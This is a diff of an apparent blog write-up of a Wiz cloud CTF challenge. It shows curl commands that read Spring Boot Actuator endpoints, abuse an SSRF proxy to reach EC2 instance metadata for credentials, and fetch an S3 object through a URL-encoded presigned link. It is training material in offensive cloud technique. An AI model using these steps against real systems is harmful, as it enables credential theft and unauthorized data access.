@@ -6,7 +6,7 @@ summary: "Going through how I navigated through this Wiz CTF"
 tags: ["Wiz", "Cloud", "Spring Boot", "Wiz x Cloud Security Championship 2025-2026", "AWS", "S3", "SSRF"]
 ---
 
-## Step 1: Yo... where am I 
+## Step 1: Getting the boots
 You are provided with the following:
 ```bash
 You've discovered a Spring Boot Actuator application running on AWS: curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com
@@ -34,7 +34,7 @@ curl -u 'ctf:88sPVWyC2P3p' https://challenge01.cloud-champions.com/actuator/heal
 # {"status":"UP"}
 ```
 
-## Step 2: What is going on 
+## Step 2: Which way do I walk with the boots
 >  The built-in endpoints are auto-configured only when they are available. Most applications choose exposure over HTTP, where the ID of the endpoint and a prefix of /actuator is mapped to a URL[^3].
 
 Based on that, lets see what endpoints are exposed:
@@ -53,7 +53,7 @@ curl -u 'ctf:88sPVWyC2P3p' https://challenge01.cloud-champions.com/actuator/env
 
 Reading through this kinda sucks but eventually something jumps out at me. I have a bucket name and a EC2 user. Also indirectly telling me the app is running inside an AWS EC2 instance. Lets keep these in mind. 
 
-## Step 3: It's never that easy
+## Step 3: It's never that easy 
 Would be a fool to not just give that a try. 
 ```bash
 aws s3 ls s3://challenge01-470f711
@@ -61,9 +61,9 @@ aws s3 ls s3://challenge01-470f711
 aws s3 ls s3://challenge01-470f711 --no-sign-request
 # An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
 ```
-Welp. Let's keep going then. Doing this kinda shows that I need to find creds somewhere. 
+Welp, I was a fool to give that a try. Let's keep going then. Doing this kinda shows that I need to find creds somewhere. 
 
-## Step 4: Going back to the beginning -> Step 2
+## Step 4: Keep walking
 Looking through more of the endpoints I see Mapping[^4]. 
 ```bash
 curl -u 'ctf:88sPVWyC2P3p' https://challenge01.cloud-champions.com/actuator/mappings
@@ -82,7 +82,7 @@ It's kinda like “Hey user, tell me a URL and I’ll fetch it for you!”
 Whenever a server-side function fetches remote URLs based on user input, and does not restrict what it can access, it’s 
 almost always exploitable.
 
-## Step 5: Does AWS stand for AW Sh*t?
+## Step 5: Getting somewhere 
 From Step 2 looking at the actuator/env path we know that there are strong indicators that the app is running inside an AWS EC2 instance.  
 
 EC2 metadata gives us temporary credentials assigned to the instance. So is it IMDSv1 or IMDSv2[^5]? Here is a nice chart. This documentation helps: [AWS: Use the Instance Metadata Service to access instance metadata](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html#instance-metadata-retrieval-examples)
@@ -179,7 +179,7 @@ cat hello.txt
 ```
 Yes I can.
 
-## Step 7: Where's the poop 
+## Step 7: How to get to the bucket 
 Errors tells me a lot. 
 We know what it is not: 
 - Credential problem (I can list the bucket)
@@ -229,6 +229,12 @@ https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=<PRESIGNED_UR
 The URL is being passed as the value to the url= parameter.
 If it contains characters like &, =, ?, they may break or truncate the parameter.
 
+Therefore we need to URL encode it. 
+
+```bash
+ENCODED=$(jq -sRr @uri <<< "<PRESIGNED_URL>") 
+```
+Then we append it to the end 
 ```bash
 curl "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=$ENCODED"
 # The flag is: WIZ_CTF_xyz 
